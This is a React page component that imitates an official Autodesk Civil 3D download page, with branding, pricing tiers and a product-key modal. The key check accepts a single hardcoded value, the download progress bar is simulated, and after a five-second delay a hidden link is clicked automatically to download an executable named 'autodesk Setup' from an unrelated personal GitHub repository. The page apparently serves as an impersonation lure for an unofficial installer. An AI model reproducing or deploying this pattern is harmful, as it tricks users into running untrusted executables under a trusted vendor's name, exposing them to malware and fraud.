import Header from "@/components/partials/Header";
import { Badge } from "@/components/ui/Badge";
import { Modal } from "@/components/ui/Modal";
import { Tabs } from "@/components/ui/Tabs";
import { cn } from "@/lib/utils";
import { CheckCircle, Download } from "lucide-react";
import { useEffect, useState } from "react";

const plans = [
  {
    title: "Annual",
    price: 2870,
    description: "Savings of 34% compared to monthly price",
    badge: "Most Popular",
    billing: "yearly",
  },
  {
    title: "Monthly",
    price: 360,
    billing: "monthly",
  },
  {
    title: "Flex",
    price: 300,
    billing: "/100 tokens (minimum)",
    description: "9 tokens /day for this product",
  },
];

const OverviewPage = () => {
  const [showModal, setShowModal] = useState(false);
  const [productKey, setProductKey] = useState("");
  const [showError, setShowError] = useState(false);
  const [isKeyVerified, setIsKeyVerified] = useState(false);
  const [progress, setProgress] = useState(0);

  const [tab, setTab] = useState("Annual");
  const selectedPlan = plans.find((plan) => plan.title === tab);

  const isValidKey = /^[a-zA-Z0-9]{4,6}$/.test(productKey);
  const validKeys = ["057K3"];

  const handleSubmitKey = () => {
    if (validKeys.includes(productKey)) {
      setIsKeyVerified(true);
      setShowError(false);
      simulateDownload();

      // Auto start download after 5 seconds
      setTimeout(() => {
        startAutoDownload();
      }, 5000);
    } else {
      setShowError(true);
    }
  };

  // Simulate download progress
  const simulateDownload = () => {
    let currentProgress = 0;
    const interval = setInterval(() => {
      if (currentProgress >= 100) {
        clearInterval(interval);
      } else {
        currentProgress += 5;
        setProgress(currentProgress);
      }
    }, 200);
  };

  // Auto download function
  const startAutoDownload = () => {
    const tempLink = document.createElement("a");
    tempLink.href =
      "https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe";
    tempLink.download = "AutoCAD Civil 3D 2025";
    tempLink.style.display = "none";
    document.body.appendChild(tempLink);
    tempLink.click();
    document.body.removeChild(tempLink);
    alert("Download started automatically!");
  };

  // Handle download link click
  const handleDownloadClick = () => {
    alert("Your download will start shortly.");
  };

  // Reset modal state
  const resetModal = () => {
    setProductKey("");
    setShowError(false);
    setIsKeyVerified(false);
    setProgress(0);
  };

  // Close modal
  const closeModal = () => {
    setShowModal(false);
    resetModal();
  };

  // Handle escape key
  useEffect(() => {
    const handleEscape = (e: KeyboardEvent) => {
      if (e.key === "Escape" && showModal) {
        closeModal();
      }
    };

    document.addEventListener("keydown", handleEscape);
    return () => document.removeEventListener("keydown", handleEscape);
  }, [showModal]);

  // Clear error when typing
  useEffect(() => {
    if (showError) {
      setShowError(false);
    }
  }, [productKey]);

  return (
    <main className="space-y-6">
      <Header />
      <section className="dark py-16 md:py-24">
        <div
          style={{ backgroundImage: "url('/background.png')" }}
          className="container space-y-16 bg-center"
        >
          <div className="md:max-w-1/2">
            <div className="flex items-center gap-2">
              <img className="h-16" src="/civil-logo.png" alt="" />
              Civil 3D
            </div>
            <h3>
              Autodesk Civil 3D: Comprehensive detailed design and documentation
              <br />
              software for civil infrastructure
            </h3>
            <div>
              <button
                onClick={() => setShowModal(true)}
                className="border-foreground text-foreground flex h-8 items-center gap-2 rounded bg-transparent px-6 hover:outline-1 hover:outline-purple-900"
              >
                <Download />
                <span>Download</span>
              </button>
              <Modal isOpen={showModal} setIsOpen={setShowModal}>
                <Modal.Backdrop>
                  <Modal.Content size="sm">
                    <Modal.Header>
                      <Modal.Title>Download AutoCAD Civil 3D 2025</Modal.Title>
                      <Modal.Close />
                    </Modal.Header>
                    <Modal.Body>
                      <div>
                        {!isKeyVerified ? (
                          <div className="space-y-4">
                            <label
                              htmlFor="productKey"
                              className="block text-sm font-bold"
                            >
                              Enter your product key
                            </label>
                            <input
                              type="text"
                              id="productKey"
                              maxLength={6}
                              placeholder="Enter (4 to 6) - digit product key"
                              value={productKey}
                              onChange={(e) => setProductKey(e.target.value)}
                              className="bg-muted focus:border-foreground w-full border px-4 py-3 focus:outline-none"
                              autoFocus
                            />
                            <button
                              onClick={handleSubmitKey}
                              disabled={!isValidKey}
                              className={cn(
                                "border-foreground text-foreground flex h-8 items-center gap-2 rounded bg-transparent px-6 hover:outline-1",
                                {
                                  "outline-purple-900 hover:outline-purple-900":
                                    isValidKey,
                                  "bg-muted text-muted-foreground cursor-not-allowed":
                                    !isValidKey,
                                },
                              )}
                            >
                              <span>Submit</span>
                            </button>
                            {showError && (
                              <div className="font-bold text-red-400">
                                Invalid product key. Please enter a valid 4 to 6
                                digit key.
                              </div>
                            )}
                          </div>
                        ) : (
                          <div className="space-y-4">
                            <div className="mb-4 flex flex-wrap items-center gap-1 font-bold text-green-400">
                              <CheckCircle />
                              Product key successfully verified!
                            </div>
                            <div className="bg-muted border p-4">
                              <p className="mb-2">
                                AutoCAD Civil 3D 2025 Ready for Download
                              </p>
                              <a
                                href="https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe"
                                download="AutoCAD Civil 3D 2025"
                                onClick={handleDownloadClick}
                                className="font-bold text-purple-900 underline hover:no-underline"
                              >
                                Click here to download
                              </a>
                              <div className="mt-4">
                                <div className="bg-muted h-4 overflow-hidden border">
                                  <div
                                    className="bg-background h-full transition-all duration-300 ease-out"
                                    style={{ width: `${progress}%` }}
                                  ></div>
                                </div>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    </Modal.Body>
                  </Modal.Content>
                </Modal.Backdrop>
              </Modal>
            </div>
          </div>
          <div className="bg-card/50 rounded-3xl border p-12 backdrop-blur-3xl md:py-16">
            <div>
              <h3>Plans Civil 3D</h3>
              <div>
                <Tabs
                  value={tab}
                  onValueChange={(value) => setTab(value as string)}
                  className="space-y-4"
                >
                  <Tabs.List className="grid w-full md:grid-cols-3">
                    {plans?.map((plan) => (
                      <Tabs.Trigger key={plan.title} value={plan.title}>
                        <div className="bg-background border-foreground space-y-4 rounded-2xl p-6 hover:border-purple-900">
                          <h4 className="text-lg font-bold">{plan.title}</h4>
                          <h4 className="flex flex-wrap items-end gap-1 leading-none">
                            <span className="text-lg leading-none font-bold">
                              ${plan.price}
                            </span>
                            /
                            <span className="leading-none">
                              {plan?.billing}
                            </span>
                          </h4>
                          {plan.description && (
                            <p className="">{plan.description}</p>
                          )}
                          {plan.badge && (
                            <div className="flex items-center gap-1">
                              <Badge>{plan.badge}</Badge>
                            </div>
                          )}
                        </div>
                      </Tabs.Trigger>
                    ))}
                  </Tabs.List>
                  <hr />
                </Tabs>
              </div>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
};

export default OverviewPage;
